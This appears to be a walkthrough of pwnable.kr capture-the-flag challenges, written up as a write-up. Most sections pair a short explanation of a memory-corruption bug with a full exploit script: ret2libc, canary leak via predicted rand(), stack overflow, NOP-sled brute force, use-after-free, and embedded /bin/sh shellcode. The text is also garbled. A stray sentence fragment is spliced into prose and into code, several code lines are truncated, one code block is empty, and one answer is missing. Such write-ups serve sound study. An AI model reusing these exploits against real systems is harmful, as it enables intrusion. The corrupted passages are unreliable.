
# PwnableWalkthrough
### BrainFuck - Level 1
The idea of this program, is to perform a return to libc attack.
The steps to get a shell are the following:
1. we leak libc. we can do it by reading one of libc functions's addresses in the got, and subtract their offsets.
2. Then, we need our code to jmp to `system` in libc. we can do it by using a rop gadget which will increase `esp` and do `ret`.
3. Then `esp` will point inside our 1024 sized buffer, so we can type `system` address to jump there.
4. system will do a `pop` to get a pointer to the argument, so I entered the start of the `tape` variable to the buffer (PIE is disabled)
5. Then I wrote to the start of the `tape` variable `/bin/sh` to pop a shell.

The code:

```py
from pwn import *

# all of these offsets can be found using the cmd: readelf -Ws bf_libc.so | grep "system|putchar..."
system_offset = 0x0003adb0
putchar_offset = 0x061930
main_addr = p32(0x08048671)
gadget_offset = 0x0005b980
buffer_addr =  p32(0x804a0a0)

#The address of tape(0x0804a0a0) - address of putchar(0x0804a030)
go_putchar = "<" * 112

temp = remote("pwnable.kr", 9001)

print(temp.recvline())
print(temp.recvline())

#first of all, we leak libc and them jmp to main
payload = "." #call putchar once, since we have partial relro enabled
payload += go_putchar
payload += '.>.>.>.>' 
payload += '<<<<'
payload += (',>,>,>,>')
payload += ">" * 108 # ret to start of arr
payload += "." # trigger putchar  to jmp to main

temp.sendline(payload)

temp.recv() #getting garbage null byte from first putchar

putchar_addr = temp.recv()

start_of_libc = u32(putchar_addr) - putchar_offset


system_addr = system_offset + start_of_libc

temp.send(main_addr)

print("Address of system ", hex(system_addr)) 
print("Libc got allocated in" , hex(start_of_libc))
print("Address of gadget is:", hex(start_of_libc + gadget_offset))

go_getchar = "<" * 148

#here we add to the stack (with the fgets) all the addresses we need
payload = b"A" * 12
payload += p32(system_addr)
payload += b"BBBB" + buffer_addr 
payload += go_putchar.encode()
payload += b',>,>,>,>'
payload += b">" * 108 # ret to start of arr
payload += b",>" * 7 #writing to the start of tape

payload += b"."

temp.sendline(payload)
temp.send(p32(start_of_libc + gadget_offset)) #our gadget will jmp to a place in the stack, where the address of system will be
temp.send("/bin/sh")

temp.interactive()

```

### md5Calculator - Level 2

Lets put the binary in IDA:

![image](https://user-images.githubusercontent.com/56035342/219431438-f84c127c-6add-4a04-bf7a-24085ace2648.png)

lets look at the `my_hash` function:

![image](https://user-images.githubusercontent.com/56035342/219431560-8ca3f5ba-5199-4295-aaeb-40b7c9caea1e.png)

As you can see, the `my_hash` function generates 8 random numbers, and does some kind of calculation with the *stack canary*.
Then the program prints that calculation to us!
But if we do the reverse of the calculation, we can leak the canary value!
how would we do it? since all of the numbers are pure random numbers generated with a seed which is the current time.
This is fine,since we can make our exploit generate 8 random numbers at the exact same time as the program does, and 
this way we can predict the random numbers and extract our `canary` from the equation.
(note that we would have to run our exploit in the target computer, since we need it to be QUICK)
Lets look at the process_hash function:
f calculation with the stack canary. Then the program prints that calculation to us! Thats really important, because if we do the
![image](https://user-images.githubusercontent.com/56035342/219432273-225ff525-eab1-4014-aa4c-1ed7527cdc68.png)

We need to enter a `1024` bytes string, then it will. be decoded using base64, and will be copied into the `decoded` variable
which is just `512` bytes. This can cause a bufferoverflow, since we can enter an input which is less then 1024, but still its decoded
base64 form will be greater than 512 bytes.
Then we can enter the leaked cookie, and change `eip` to whatever we want!
Since the `NX` bit is on, we can't just jump to our shellcode.
but we can see that there is a `system` call at the end of the `main` function.
we can use that to our adventage, to spawn a shell!
The exploit is as follows:

```py

from pwn import *
import time
from ctypes import CDLL
import base64

seed = int(time())
system_addr = 0x08049187 # end of main
gbuf_addr = 0x0804b0e0 

p = remote("localhost" , 9002)

libc = CDLL("libc.so.6") #the libc where rand() gets called
libc.srand(seed)
rands = []

libc.rand() #garbage
for i in range(0, 8):
    rands.append(libc.rand())

hashWithoutCookie = rands[0]+rands[4]+rands[1]-rands[2]+rands[6]-rands[5]+rands[3]

p.recvuntil(b"captcha : ")f calculation with the stack canary. Then the program prints that calculation to us! Thats really important, because if we do the
wholeHash = int(p.recvline())
cookie = (wholeHash - hashWithoutCookie) & 0xffffffff
p.sendline(str(wholeHash))
p.recvuntil(b"then paste me!\n")
sizeOfPayload = 716 #can be achived by printing the length of payload before
payload = base64.b64encode(b"A" * 512 + p32(cookie) + b"A" * 12 + p32(system_addr)>
payload += "/bin/sh\00"
p.sendline(payload)

p.interactive()

```


The code:

```py

```

### Tiny Easy - Level 6

Now we have a program which contains just 4 lines of assembly instructions:

```assembly
0x8048054:   pop    eax
0x8048055:   pop    edx
0x8048056:   mov    edx,DWORD PTR [edx]
0x8048058:   call   edx
```
It pops twice, and jumps to where the pointer points to.
Since that at the beginning of each program the os is pushing argv + env to the stack,
the program will call `argv[0]`.
So now we have found a way to jump to any location we want.
The problem in this challenge is that we have some kind of alsr, which randomizes our stack.
So that means we don't have a constant address of where the stack start, so we can't just jump there.
My way of bypassing that is by using brute force.
We fill all of the with nops, by adding a lot of environment variables that will be pushed to the stack.
and after that there will be our shellcode.
we can try to run the program a lot of times and jump to an address we decide.
If the address is by any chance in the stack, we will reach our shellcode and get a shell.
A good way to choose the address is by running the program in `gdb`, and looking at where `argv` is.
(it doesn't mean that it will be always that address, but it means that its possible)

Exploit:

```python
from pwn import *

shellCode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

path = "tiny_easy"
address = '\x69\x69\xb0\xff'
envv = {str(i):("\x90" * 1000 + shellCode) for i in range(200)}

for i in range(400):

        temp = process(argv=[address], executable=path, env=envv)
        try:
                temp.recvline(timeout=1)
                temp.interactive()
                break
        except Exception as e:
                temp.close()
                print(i, "failed")
                print(e)
```


### Dragon - Level 10

We have a cool program, which lets us fight a dragon.
I have put the binary in IDA, found some things about the program:
![image](https://user-images.githubusercontent.com/56035342/214085600-37b910fe-70eb-4dbd-883c-c9803358de19.png)

The program calls the attack function, and checks if the returned value is 0. if it does, it will make us winners.
Lets see what can we do in order to win:
First of all, I noticed that I can switch between the Mom dragon and the Baby dragon each time I die.

![image](https://user-images.githubusercontent.com/56035342/214086610-54b3c3d2-e217-4ab3-947e-d5d6c1978b81.png)

This is the Priest Attaf calculation with the stack canary. Then the program prints that calculation to us! Thats really important, because if we do theck.
We can see that it will ask us for input, until the user dies (green), or the dragon dies(red).
Our job is to win, and kill the dragon.
We can see something interesting in the while last loop.
it makes the pointer a char pointer, and then dereferences it , and checks if the health is bigger than zero.
But lets keep in mind that char can only contain 256 numbers, (-128 to 128)
so if the health of the dragon will be greater than 128, we will get an overflow, and win! (it gets bigger by 4 each move)
The best way to do it is by losing in purpose to the Mom dragon , and fight the baby dragon (it has less damage), this time we will have the most turns.
After that, the user will choose the Priest, and they will just pick HolyShield until they don't have mana, and then they will pick Clarity to refresh the mana.
Then , after we win, a free will be done to the dragon object, and then it will malloc a new block with our input!
![image](https://user-images.githubusercontent.com/56035342/214087910-193897b2-8ad4-4f76-bf5e-ddfa71c19a5d.png)
So we can just replace the old function reference to the system call, and we will get a shell!

`(python2 -c "print('1\n1\n1\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n' + '\xbf\x8d\x04\x08\n')"; cat) | nc pwnable.kr 9004`


### Fix - Level 9

We have a simple c program, which simulates buffer overflow with a shellcode from shell-storm.
The only thing we can do is to change 1 byte of the shellcode to whatever we want, in order to make it work.
After debugging the binary, I noticed that all the shellcode gets overwritten after this assembly line:

```assembly
xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax -----> this line
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

```

This happens because the shellcode is stored in the stack, and the `push` command is writing stuff to the stack, so it overwrites the next commands.
Which means if we will be able to just change `esp` to some random location, we will be able to push to the stack normally without overriding next instructions.
Since we can only change 1 byte of the shellcode, the only 1 byte command we can use is pop.
So to change esp we would have to do `pop esp`, which is `0x5c`
We can for example change one of the pushes, since they are 1 byte aswell.
One thing to notice is that we normally can't do things like `xor esp, esp`, `pop esp`, because esp is a special register.
In order to be able to do it we would have to run the command `ulimit -s unlimited`.
So the answer will be:

### Echo1 - Level 12

We have a program which asks a user for a name, and then a string and it echos the string.
the vulnerability in this program is that when we get input from the user, we can write after the string, since the fgets writes to many characters:
![image](https://user-images.githubusercontent.com/56035342/212696261-e353434b-a8be-4d17-89ca-c401835d1b11.png)
So we can understand that the challenge is some kind of a bufferoverflow.
After doing what we usually do when facing a bufferoverflow vulnerability,
I have found that the return address is stored 40 characters after the string(32 (size of buffer) + 8(ebp))
Another important thing to notice is that when we enter the name, it takes the first 4 bytes and puts it in the variable `id`, which is stored in `0x6020A0`, which means we can control a variable at a location we know, which is a really powerfull thing(spoiler: because we can jmp to that location and run an instruction we want)
In order to exploit those vulnerabilies, I have done the following things:
First of all, I compiled the command `jmp rsp`, which jumps to the value of rsp. it gave me `\xff\xe4`.
We need that specific command, beacause its the exact location of the end of the buffer, where our shellcode is located.
Now we need 40 characters to reach to the return pointer.
Then we need to specify an address which our code will jump to when the `ret` instruction is called.
I entered the address of id(`0x6020A0`) because then it will execute the command I entered, which is `jmp rsp`.
Then I have specified our shellcode, which will execute `/bin/sh` and give us a shell.
The final exploit code is as follows:

```py
from pwn import *

ssh=remote('pwnable.kr',9010)
shellCode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x>
jmpRSP = "\xff\xe4"
space = '\x90' * 40
keyAddress = '\xa0\x20\x60\x00\x00\x00\x00\x00'

ssh.sendline(jmpRSP)
ssh.sendline("1")
ssh.sendline(space + keyAddress + shellCode)
ssh.interactive()

```

### Echo2 - Level 13

This time we have the same program as `echo`, but the difference now is that we can only choose `FSB` or `UAF` in the menu.
One important thing we need to notice, is that once we press `4` for exit, it will instanstly free the `o` variable, which is storing the echo function.
We can use that for our own advantage, since we can trigger a free, and the program will still be ran (if we press n)
This way we can override the `greetings` function stored in the `o` variable, and jump to any location we want.
We can do it by using the `UAF` option, since it allocates a chunk in the heap, so if there is a free chunk there, we will be able to control the `o` varible.
Then I entered a shellcode in the name (because then it will be in the stack), and then I used the `FSB` in the menu, to leak stack addresses.
I noticed that in the 10th paramater, there is a pointer to the stack which is 32 bytes after our input.
So if we substract 32 from that number, and override the `greetings` function with it, we will run the shellcode specified in the name!

Final exploit:


```py
from pwn import *

p=remote('pwnable.kr',9011)

shellCode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
print(p.recv().decode())

#Sending username
p.sendline(shellCode)

print(p.recv())

#trigger free
print("Triggering free...")
p.sendline(b"4")
print(p.recv().decode())
p.sendline(b"n")

print("Getting stack addresses...")
print(p.recv().decode())
p.sendline(b"2")
print(p.recv().decode())
p.sendline(b"%10$p")
p.recv()
stack_addr = p.recv().decode().split("\n")[0]


print("stack leaked address is", stack_addr)

shellCodeAddr = p64(int(stack_addr, 16) - 32)

print("shellcode leaked addr: ", hex(u64(shellCodeAddr)))
p.sendline(b"3")

#changing the greeteings to jmp to our shellcode
p.sendline((24 * b"\x90") +  shellCodeAddr)

p.interactive()


```





